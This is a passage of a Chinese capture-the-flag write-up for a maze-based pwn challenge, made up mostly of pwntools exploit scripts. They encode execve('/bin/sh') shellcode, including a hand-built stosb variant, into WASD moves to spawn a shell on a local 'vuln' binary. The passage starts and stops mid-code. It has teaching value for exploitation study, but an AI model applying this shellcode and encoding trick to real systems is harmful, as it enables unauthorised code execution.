<a id="__codelineno-19-69" name="__codelineno-19-69" href="#__codelineno-19-69"></a>        <span class="n">path</span> <span class="o">+=</span> <span class="n">mapping</span><span class="p">[</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]</span>
<a id="__codelineno-19-70" name="__codelineno-19-70" href="#__codelineno-19-70"></a>
<a id="__codelineno-19-71" name="__codelineno-19-71" href="#__codelineno-19-71"></a>    <span class="k">return</span> <span class="n">path</span>
<a id="__codelineno-19-72" name="__codelineno-19-72" href="#__codelineno-19-72"></a>
<a id="__codelineno-19-73" name="__codelineno-19-73" href="#__codelineno-19-73"></a><span class="nb">print</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-19-74" name="__codelineno-19-74" href="#__codelineno-19-74"></a><span class="nb">print</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))))</span>
<a id="__codelineno-19-75" name="__codelineno-19-75" href="#__codelineno-19-75"></a><span class="n">shellcode2</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-76" name="__codelineno-19-76" href="#__codelineno-19-76"></a><span class="s1">call rax</span>
<a id="__codelineno-19-77" name="__codelineno-19-77" href="#__codelineno-19-77"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-19-78" name="__codelineno-19-78" href="#__codelineno-19-78"></a><span class="c1">#print(shellcode_to_wasd(asm(shellcode2)),len(shellcode_to_wasd(asm(shellcode2))))</span>
<a id="__codelineno-19-79" name="__codelineno-19-79" href="#__codelineno-19-79"></a><span class="c1">#@path=&#39;dwws&#39;</span>
<a id="__codelineno-19-80" name="__codelineno-19-80" href="#__codelineno-19-80"></a><span class="c1">#print(wasd_to_asm(path))</span>
<a id="__codelineno-19-81" name="__codelineno-19-81" href="#__codelineno-19-81"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-19-82" name="__codelineno-19-82" href="#__codelineno-19-82"></a><span class="sd">1 1 1</span>
<a id="__codelineno-19-83" name="__codelineno-19-83" href="#__codelineno-19-83"></a><span class="sd">1 1 1</span>
<a id="__codelineno-19-84" name="__codelineno-19-84" href="#__codelineno-19-84"></a><span class="sd">1 1 1</span>
<a id="__codelineno-19-85" name="__codelineno-19-85" href="#__codelineno-19-85"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-19-86" name="__codelineno-19-86" href="#__codelineno-19-86"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;seed&quot;</span><span class="p">)</span>
<a id="__codelineno-19-87" name="__codelineno-19-87" href="#__codelineno-19-87"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">7785659896892777472</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-19-88" name="__codelineno-19-88" href="#__codelineno-19-88"></a><span class="nb">print</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
<a id="__codelineno-19-89" name="__codelineno-19-89" href="#__codelineno-19-89"></a>
<a id="__codelineno-19-90" name="__codelineno-19-90" href="#__codelineno-19-90"></a><span class="n">path</span><span class="o">=</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-19-91" name="__codelineno-19-91" href="#__codelineno-19-91"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">path</span><span class="p">)):</span>
<a id="__codelineno-19-92" name="__codelineno-19-92" href="#__codelineno-19-92"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;MAZE&quot;</span><span class="p">)</span>
<a id="__codelineno-19-93" name="__codelineno-19-93" href="#__codelineno-19-93"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">path</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<a id="__codelineno-19-94" name="__codelineno-19-94" href="#__codelineno-19-94"></a>
<a id="__codelineno-19-95" name="__codelineno-19-95" href="#__codelineno-19-95"></a><span class="n">next_path</span><span class="o">=</span><span class="s1">&#39;ssddddwwwwdd&#39;</span>
<a id="__codelineno-19-96" name="__codelineno-19-96" href="#__codelineno-19-96"></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">next_path</span><span class="p">)):</span>
<a id="__codelineno-19-97" name="__codelineno-19-97" href="#__codelineno-19-97"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;MAZE&quot;</span><span class="p">)</span>
<a id="__codelineno-19-98" name="__codelineno-19-98" href="#__codelineno-19-98"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">next_path</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
<a id="__codelineno-19-99" name="__codelineno-19-99" href="#__codelineno-19-99"></a><span class="nb">print</span><span class="p">(</span><span class="n">shellcode_to_wasd</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())))</span>
<a id="__codelineno-19-100" name="__codelineno-19-100" href="#__codelineno-19-100"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></p>
<p><strong>奶茶</strong>
出题人说不用shellcode可以拿奶茶，我做了一下，首先种子不用换，还用之前的就可以， 然后比较烦人的是shellcode中的
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">mov</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="mh">0x732f2f2f6e69622f</span>
</code></pre></div>
这一部分，然后最开始的想法是用分段的方式，先mov高32位，低32位用来调整位置，然后再<code>mov eax mov ax</code>这样去调整
本来都写完了，调试的时候发现，tmd <code>mov eax</code>会把高位置零，白跑了
最后突然想到，可以用
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">stosb</span>
</code></pre></div>
的方式来做这个，这个指令等效为
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>mov [rdi],al
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>inc rdi
</code></pre></div>
于是用这个来做
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">rex</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">clc</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">push</span><span class="w"> </span><span class="mh">0x68</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">push</span><span class="w"> </span><span class="m">12</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">mov</span><span class="w"> </span><span class="n">rdi</span><span class="p">,</span><span class="n">rsp</span>
<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x2f</span>
<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="n">stosb</span>
<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x62</span>
<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="n">clc</span>
<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="n">clc</span>
<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="n">rex</span>
<a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="n">stosb</span>
<a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x69</span>
<a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="n">clc</span>
<a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="n">rex</span>
<a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="n">stosb</span>
<a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x6e</span>
<a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="n">rex</span>
<a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a><span class="n">stosb</span>
<a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a><span class="n">rex.W</span>
<a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x2f</span>
<a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="n">clc</span>
<a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a><span class="n">stosb</span>
<a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a><span class="n">stosb</span>
<a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a><span class="n">clc</span>
<a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a><span class="n">rex</span><span class="p">,</span><span class="n">WB</span>
<a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a><span class="n">stosb</span>
<a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="mh">0x73</span>
<a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a><span class="n">clc</span>
<a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a><span class="n">stosb</span>
<a id="__codelineno-23-37" name="__codelineno-23-37" href="#__codelineno-23-37"></a><span class="n">rex.W</span>
<a id="__codelineno-23-38" name="__codelineno-23-38" href="#__codelineno-23-38"></a><span class="n">mov</span><span class="w"> </span><span class="n">rdi</span><span class="p">,</span><span class="n">rsp</span>
<a id="__codelineno-23-39" name="__codelineno-23-39" href="#__codelineno-23-39"></a><span class="n">clc</span>
<a id="__codelineno-23-40" name="__codelineno-23-40" href="#__codelineno-23-40"></a><span class="n">mov</span><span class="w"> </span><span class="n">al</span><span class="p">,</span><span class="m">59</span><span class="c1">#execve syscall number</span>
<a id="__codelineno-23-41" name="__codelineno-23-41" href="#__codelineno-23-41"></a><span class="n">rex.WB</span>
<a id="__codelineno-23-42" name="__codelineno-23-42" href="#__codelineno-23-42"></a><span class="n">rex</span>
<a id="__codelineno-23-43" name="__codelineno-23-43" href="#__codelineno-23-43"></a><span class="n">syscall</span>
</code></pre></div>
用这个来执行<code>execve("/bin/sh\x00",0,0)</code>
其余寄存器是空的，设置好al即可</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">backdoor</span><span class="o">=</span><span class="mh">0x12a9</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">ret</span><span class="o">=</span><span class="mh">0x17c8</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;splitw&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="n">pre_shellcode</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="s1">pop rax</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="s1">sub rax,1311</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="s1">call rax</span>
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="n">shel1code</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="s1">rex.X</span>
<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="s1">pop rax</span>
<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="s1">clc</span>
<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="s1">rex.X</span>
<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="s1">sub ax,1311</span>
<a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a><span class="s1">call rax</span>
<a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a><span class="n">shellcode</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a><span class="s1">rex</span>
<a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a><span class="s1">clc</span>
<a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a><span class="s1">push 0x68</span>
<a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a><span class="s1">push 12</span>
<a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a><span class="s1">mov rdi,rsp</span>
<a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a><span class="s1">mov al,0x2f</span>
<a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a><span class="s1">stosb</span>
<a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a><span class="s1">mov al,0x62</span>
<a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a><span class="s1">clc</span>
<a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a><span class="s1">clc</span>
<a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a><span class="s1">rex</span>
<a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a><span class="s1">stosb</span>
<a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a><span class="s1">mov al,0x69</span>
<a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a><span class="s1">clc</span>
<a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a><span class="s1">rex</span>
<a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a><span class="s1">stosb</span>
<a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a><span class="s1">mov al,0x6e</span>
<a id="__codelineno-24-40" name="__codelineno-24-40" href="#__codelineno-24-40"></a><span class="s1">rex</span>
<a id="__codelineno-24-41" name="__codelineno-24-41" href="#__codelineno-24-41"></a><span class="s1">stosb</span>
<a id="__codelineno-24-42" name="__codelineno-24-42" href="#__codelineno-24-42"></a><span class="s1">rex.W</span>
<a id="__codelineno-24-43" name="__codelineno-24-43" href="#__codelineno-24-43"></a><span class="s1">mov al,0x2f</span>
<a id="__codelineno-24-44" name="__codelineno-24-44" href="#__codelineno-24-44"></a><span class="s1">clc</span>
<a id="__codelineno-24-45" name="__codelineno-24-45" href="#__codelineno-24-45"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-46" name="__codelineno-24-46" href="#__codelineno-24-46"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-47" name="__codelineno-24-47" href="#__codelineno-24-47"></a><span class="s1">stosb</span>
<a id="__codelineno-24-48" name="__codelineno-24-48" href="#__codelineno-24-48"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-49" name="__codelineno-24-49" href="#__codelineno-24-49"></a><span class="s1">stosb</span>
<a id="__codelineno-24-50" name="__codelineno-24-50" href="#__codelineno-24-50"></a><span class="s1">clc</span>
<a id="__codelineno-24-51" name="__codelineno-24-51" href="#__codelineno-24-51"></a><span class="s1">rex,WB</span>
<a id="__codelineno-24-52" name="__codelineno-24-52" href="#__codelineno-24-52"></a><span class="s1">stosb</span>
<a id="__codelineno-24-53" name="__codelineno-24-53" href="#__codelineno-24-53"></a><span class="s1">mov al,0x73</span>
<a id="__codelineno-24-54" name="__codelineno-24-54" href="#__codelineno-24-54"></a><span class="s1">clc</span>
<a id="__codelineno-24-55" name="__codelineno-24-55" href="#__codelineno-24-55"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-56" name="__codelineno-24-56" href="#__codelineno-24-56"></a><span class="s1">stosb</span>
<a id="__codelineno-24-57" name="__codelineno-24-57" href="#__codelineno-24-57"></a><span class="s1">rex.W</span>
<a id="__codelineno-24-58" name="__codelineno-24-58" href="#__codelineno-24-58"></a><span class="s1">mov rdi,rsp</span>
<a id="__codelineno-24-59" name="__codelineno-24-59" href="#__codelineno-24-59"></a><span class="s1">clc</span>
<a id="__codelineno-24-60" name="__codelineno-24-60" href="#__codelineno-24-60"></a><span class="s1">mov al,59#execve syscall number</span>
<a id="__codelineno-24-61" name="__codelineno-24-61" href="#__codelineno-24-61"></a><span class="s1">rex.WB</span>
<a id="__codelineno-24-62" name="__codelineno-24-62" href="#__codelineno-24-62"></a><span class="s1">rex</span>
<a id="__codelineno-24-63" name="__codelineno-24-63" href="#__codelineno-24-63"></a><span class="s1">syscall</span>
<a id="__codelineno-24-64" name="__codelineno-24-64" href="#__codelineno-24-64"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-65" name="__codelineno-24-65" href="#__codelineno-24-65"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-66" name="__codelineno-24-66" href="#__codelineno-24-66"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-67" name="__codelineno-24-67" href="#__codelineno-24-67"></a>
<a id="__codelineno-24-68" name="__codelineno-24-68" href="#__codelineno-24-68"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-69" name="__codelineno-24-69" href="#__codelineno-24-69"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-70" name="__codelineno-24-70" href="#__codelineno-24-70"></a><span class="sd">mov rdi,rsp</span>
<a id="__codelineno-24-71" name="__codelineno-24-71" href="#__codelineno-24-71"></a>
<a id="__codelineno-24-72" name="__codelineno-24-72" href="#__codelineno-24-72"></a><span class="sd">rex</span>
<a id="__codelineno-24-73" name="__codelineno-24-73" href="#__codelineno-24-73"></a><span class="sd">stosb</span>
<a id="__codelineno-24-74" name="__codelineno-24-74" href="#__codelineno-24-74"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-75" name="__codelineno-24-75" href="#__codelineno-24-75"></a>
<a id="__codelineno-24-76" name="__codelineno-24-76" href="#__codelineno-24-76"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-77" name="__codelineno-24-77" href="#__codelineno-24-77"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-78" name="__codelineno-24-78" href="#__codelineno-24-78"></a><span class="sd">mov al,0x2f</span>
<a id="__codelineno-24-79" name="__codelineno-24-79" href="#__codelineno-24-79"></a>
<a id="__codelineno-24-80" name="__codelineno-24-80" href="#__codelineno-24-80"></a>
<a id="__codelineno-24-81" name="__codelineno-24-81" href="#__codelineno-24-81"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-82" name="__codelineno-24-82" href="#__codelineno-24-82"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-83" name="__codelineno-24-83" href="#__codelineno-24-83"></a><span class="sd">rex</span>
<a id="__codelineno-24-84" name="__codelineno-24-84" href="#__codelineno-24-84"></a><span class="sd">nop</span>
<a id="__codelineno-24-85" name="__codelineno-24-85" href="#__codelineno-24-85"></a><span class="sd">mov eax,0x6e692222</span>
<a id="__codelineno-24-86" name="__codelineno-24-86" href="#__codelineno-24-86"></a><span class="sd">clc</span>
<a id="__codelineno-24-87" name="__codelineno-24-87" href="#__codelineno-24-87"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-88" name="__codelineno-24-88" href="#__codelineno-24-88"></a><span class="sd">clc</span>
<a id="__codelineno-24-89" name="__codelineno-24-89" href="#__codelineno-24-89"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-90" name="__codelineno-24-90" href="#__codelineno-24-90"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-91" name="__codelineno-24-91" href="#__codelineno-24-91"></a><span class="sd">mov ax,0x622f</span>
<a id="__codelineno-24-92" name="__codelineno-24-92" href="#__codelineno-24-92"></a><span class="sd">push rax</span>
<a id="__codelineno-24-93" name="__codelineno-24-93" href="#__codelineno-24-93"></a><span class="sd">mov rdi,rsp</span>
<a id="__codelineno-24-94" name="__codelineno-24-94" href="#__codelineno-24-94"></a><span class="sd">clc</span>
<a id="__codelineno-24-95" name="__codelineno-24-95" href="#__codelineno-24-95"></a><span class="sd">clc</span>
<a id="__codelineno-24-96" name="__codelineno-24-96" href="#__codelineno-24-96"></a><span class="sd">rex.W</span>
<a id="__codelineno-24-97" name="__codelineno-24-97" href="#__codelineno-24-97"></a><span class="sd">xor rsi,rsi</span>
<a id="__codelineno-24-98" name="__codelineno-24-98" href="#__codelineno-24-98"></a><span class="sd">push 59</span>
<a id="__codelineno-24-99" name="__codelineno-24-99" href="#__codelineno-24-99"></a><span class="sd">pop rax</span>
<a id="__codelineno-24-100" name="__codelineno-24-100" href="#__codelineno-24-100"></a><span class="sd">clc</span>
<a id="__codelineno-24-101" name="__codelineno-24-101" href="#__codelineno-24-101"></a><span class="sd">mov rdx,rsi</span>
<a id="__codelineno-24-102" name="__codelineno-24-102" href="#__codelineno-24-102"></a><span class="sd">rex.WB</span>
<a id="__codelineno-24-103" name="__codelineno-24-103" href="#__codelineno-24-103"></a><span class="sd">syscall</span>
<a id="__codelineno-24-104" name="__codelineno-24-104" href="#__codelineno-24-104"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-24-105" name="__codelineno-24-105" href="#__codelineno-24-105"></a>
<a id="__codelineno-24-106" name="__codelineno-24-106" href="#__codelineno-24-106"></a><span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-107" name="__codelineno-24-107" href="#__codelineno-24-107"></a><span class="s1">b mmap</span>
<a id="__codelineno-24-108" name="__codelineno-24-108" href="#__codelineno-24-108"></a><span class="s1">c</span>
<a id="__codelineno-24-109" name="__codelineno-24-109" href="#__codelineno-24-109"></a><span class="s1">c</span>
<a id="__codelineno-24-110" name="__codelineno-24-110" href="#__codelineno-24-110"></a><span class="s1">c</span>
<a id="__codelineno-24-111" name="__codelineno-24-111" href="#__codelineno-24-111"></a><span class="s1">c</span>
<a id="__codelineno-24-112" name="__codelineno-24-112" href="#__codelineno-24-112"></a><span class="s1">c</span>
<a id="__codelineno-24-113" name="__codelineno-24-113" href="#__codelineno-24-113"></a><span class="s1">c</span>
<a id="__codelineno-24-114" name="__codelineno-24-114" href="#__codelineno-24-114"></a><span class="s1">c</span>
<a id="__codelineno-24-115" name="__codelineno-24-115" href="#__codelineno-24-115"></a><span class="s1">c</span>
<a id="__codelineno-24-116" name="__codelineno-24-116" href="#__codelineno-24-116"></a><span class="s1">c</span>
<a id="__codelineno-24-117" name="__codelineno-24-117" href="#__codelineno-24-117"></a><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-24-118" name="__codelineno-24-118" href="#__codelineno-24-118"></a><span class="c1">#p=gdb.debug(&quot;./vuln&quot;,gdbscript=gdbscript)</span>
<a id="__codelineno-24-119" name="__codelineno-24-119" href="#__codelineno-24-119"></a><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./vuln&quot;</span><span class="p">)</span>
<a id="__codelineno-24-120" name="__codelineno-24-120" href="#__codelineno-24-120"></a><span class="c1">#p=remote(&#39;127.0.0.1&#39;,57826)</span>
<a id="__codelineno-24-121" name="__codelineno-24-121" href="#__codelineno-24-121"></a><span class="k">def</span><span class="w"> </span><span class="nf">wasd_to_asm</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">):</span>
<a id="__codelineno-24-122" name="__codelineno-24-122" href="#__codelineno-24-122"></a>    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">arch</span>
<a id="__codelineno-24-123" name="__codelineno-24-123" href="#__codelineno-24-123"></a>    <span class="n">mapping</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;w&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">}</span>
<a id="__codelineno-24-124" name="__codelineno-24-124" href="#__codelineno-24-124"></a>    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
<a id="__codelineno-24-125" name="__codelineno-24-125" href="#__codelineno-24-125"></a>
<a id="__codelineno-24-126" name="__codelineno-24-126" href="#__codelineno-24-126"></a>    <span class="c1"># 每4个字符转为1个字节</span>
<a id="__codelineno-24-127" name="__codelineno-24-127" href="#__codelineno-24-127"></a>    <span class="c1"># 忽略末尾不足4个字符的部分</span>
<a id="__codelineno-24-128" name="__codelineno-24-128" href="#__codelineno-24-128"></a>    <span class="n">limit</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">wasd_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
<a id="__codelineno-24-129" name="__codelineno-24-129" href="#__codelineno-24-129"></a>
<a id="__codelineno-24-130" name="__codelineno-24-130" href="#__codelineno-24-130"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
